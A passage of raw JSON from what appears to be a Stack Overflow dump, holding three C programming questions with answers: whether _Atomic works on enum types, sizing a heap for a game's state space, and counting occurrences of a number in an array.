explorer</a>).</p>\n\n<hr>\n\n<p>It's just a quirk of GCC's implementation that it compiles without even a warning, even at <code>-Wall</code>.  That should probably be changed...</p>\n\n<p><a href=\"https://gcc.gnu.org/onlinedocs/gcc/_005f_005fatomic-Builtins.html\" rel=\"nofollow noreferrer\">GCC's atomic builtins</a> like <code>void __atomic_store_n (type *ptr, type val, int memorder)</code> take a pointer to a plain type, without requiring <code>_Atomic</code>.</p>\n\n<p>C++11 <code>&lt;atomic&gt;</code> uses these builtins.  Similarly, GCC's C11 <code>stdatomic.h</code> uses</p>\n\n<pre><code>#define atomic_store_explicit(PTR, VAL, MO)                             \\\n  __extension__                                                         \\\n  ({                                                                    \\\n    __auto_type __atomic_store_ptr = (PTR);                             \\\n    __typeof__ (*__atomic_store_ptr) __atomic_store_tmp = (VAL);        \\\n    __atomic_store (__atomic_store_ptr, &amp;__atomic_store_tmp, (MO));     \\\n  })\n\n#define atomic_store(PTR, VAL)                          \\\n  atomic_store_explicit (PTR, VAL, __ATOMIC_SEQ_CST)\n</code></pre>\n\n<p>(The <code>__extension__</code> is for the GNU C statement-expression, where <code>x = {foo; bar;}</code> takes the value of <code>bar</code>.)</p>\n\n<p>So none of this actually requires that the pointer type has <code>_Atomic</code>.</p>\n"}], "owner": {"reputation": 322, "user_id": 4138486, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/11238e90cfc9d53b5c1e770bfc7569d3?s=128&d=identicon&r=PG&f=1", "display_name": "Austin Glaser", "link": "https://stackoverflow.com/users/4138486/austin-glaser"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 561, "favorite_count": 0, "accepted_answer_id": 55010793, "answer_count": 2, "score": 4, "last_activity_date": 1551826298, "creation_date": 1551815888, "question_id": 55010595, "link": "https://stackoverflow.com/questions/55010595/can-i-apply-the-c11-atomic-keyword-to-enum-types", "title": "Can I apply the C11 `_Atomic` keyword to enum types?", "body": "<p>If I have a type</p>\n\n<pre><code>enum foo {\n    FOO,\n    BAR,\n    BAZ,\n};\n</code></pre>\n\n<p>can I then declare an atomic version of that type like</p>\n\n<pre><code>_Atomic(enum foo);\n</code></pre>\n\n<p>or do I have to use e.g. <code>atomic_int</code> and cast the result of <code>atomic_load()</code>?</p>\n\n<p>The following program compiles without warnings:</p>\n\n<pre><code>#include &lt;stdatomic.h&gt;\n#include &lt;stdio.h&gt;\n\nenum foo {\n    FOO,\n    BAR,\n    BAZ,\n};\n\nint main(void) {\n    _Atomic(enum foo) foo_a;\n\n    atomic_store(&amp;foo_a, BAR);\n\n    enum foo val = atomic_load(&amp;foo_a);\n\n    printf(\"%u\\n\", val);\n\n    return 0;\n}\n</code></pre>\n\n<p>but so does</p>\n\n<pre><code>#include &lt;stdatomic.h&gt;\n#include &lt;stdio.h&gt;\n\nenum foo {\n    FOO,\n    BAR,\n    BAZ,\n};\n\nint main(void) {\n    enum foo foo;\n\n    atomic_store(&amp;foo, BAR);\n\n    enum foo val = atomic_load(&amp;foo);\n\n    printf(\"%u\\n\", val);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "size", "heap", "heap-memory"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551815263, "post_id": 55010318, "comment_id": 96775739, "body": "If each game state requires 5KB to describe it, that will need less than 2GB to store."}], "answers": [{"tags": [], "owner": {"reputation": 716, "user_id": 6507170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EdjYE.png?s=128&g=1", "display_name": "priojeet priyom", "link": "https://stackoverflow.com/users/6507170/priojeet-priyom"}, "is_accepted": true, "score": 0, "last_activity_date": 1551821995, "creation_date": 1551821995, "answer_id": 55012035, "question_id": 55010318, "link": "https://stackoverflow.com/questions/55010318/is-possible-to-create-min-max-heap-without-knowing-the-final-size/55012035#55012035", "title": "Is possible to create min/max heap without knowing the final size?", "body": "<p>Assuming you will need to store one integer value for each state.\nTotal size =9! * sizeof int (4byte) = 1.384MB. It isn't quite much! Also if there is no inner loop to compute the states then the time complexity should be O(10^6) and should take few miliseconds to compute.</p>\n\n<p>Yes.you can create heap without knowing the final size.Just use linked list and dynamic memory allocation.</p>\n"}], "owner": {"reputation": 33, "user_id": 10525087, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66aa4c659e27522dc2a81aaa7f8dc006?s=128&d=identicon&r=PG&f=1", "display_name": "A.Cabb", "link": "https://stackoverflow.com/users/10525087/a-cabb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "accepted_answer_id": 55012035, "answer_count": 1, "score": 1, "last_activity_date": 1551821995, "creation_date": 1551814747, "question_id": 55010318, "link": "https://stackoverflow.com/questions/55010318/is-possible-to-create-min-max-heap-without-knowing-the-final-size", "title": "Is possible to create min/max heap without knowing the final size?", "body": "<p>I am trying to code a program, which will examine state space of simple game. </p>\n\n<p>This program will use heuristic function, and I want to order generated states in min-heap by the given value of that heuristic function. </p>\n\n<p>But what size of heap it should be? The maximum number of states which could be generated is 9!, which is quite a lot, I think. How to manage this, if I do not want to allocate that huge memory space at once?</p>\n\n<p>I am coding this in C. Any ideas?</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1551814607, "post_id": 55010275, "comment_id": 96775472, "body": "You should take the input outside the loop. What&#39;s <code>j</code> anyway?"}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 1, "last_activity_date": 1551814686, "creation_date": 1551814686, "answer_id": 55010305, "question_id": 55010275, "link": "https://stackoverflow.com/questions/55010275/checking-to-see-how-many-times-a-number-appears-in-an-array/55010305#55010305", "title": "Checking to see how many times a number appears in an array", "body": "<p>You're asking the user for a number on every iteration through the loop and printing the count on every iteration.  Also, you should be indexing <code>nums[i]</code>, not <code>nums[j]</code></p>\n\n<p>Move the input before the loop and the output after.</p>\n\n<pre><code>printf(\"Enter a number between 1 and 20 to be found (&lt;=0 for exit): \");\nscanf(\"%d\", &amp;n);\n\nif (n &lt;= 0) {\n    printf(\"End\\n\");\n    return 1;\n}\nfor (i = 0; i &lt; N; i++) {\n    if (nums[i] == n) {\n        count++;\n    }\n}\nprintf(\"%d appears %d times \\n\" , n, count);\n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 10970323, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-r2q0m9iVncQ/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcblwHeupfgjKO5G7RxDuHPuv1FCVQ/mo/photo.jpg?sz=128", "display_name": "Asad Jawaid", "link": "https://stackoverflow.com/users/10970323/asad-jawaid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1551814686, "creation_date": 1551814542, "question_id": 55010275, "link": "https://stackoverflow.com/questions/55010275/checking-to-see-how-many-times-a-number-appears-in-an-array", "title": "Checking to see how many times a number appears in an array", "body": "<p>I have been stuck on this problem for a while. I am new to programming in C and I would like to figure out how can I see if a user enters a number between 1 to 20 and checks to see if the number entered by user appears in the array of random numbers between 1 and 20 which then displays to the user that the number they have entered is appeared \"number of times\". </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#define N 30\nint main(void)\n{\n    int nums[N];\n    int numAppear, i, count = 0;\n    int n;\n\n    for (i = 0; i &lt; N; i++) {\n      nums[i] = rand()%20 + 1;\n    }\n\n    for (i = 0; i &lt; N; i++) {\n        printf(\"Enter a number between 1 and 20 to be found (&lt;=0 for exit): \");\n        scanf(\"%d\", &amp;n);\n\n        if (n &lt;= 0) {\n            printf(\"End\\n\");\n            break;\n        }\n        else if (nums[j] == n) {\n            count++;\n            printf(\"%d appears %d times \\n\" , n, count);\n        }\n        else {\n            printf(\"%d appears %d times \\n\" , n, count);\n        }\n    }\n    return 0;\n}\n</code></pre>\n"}]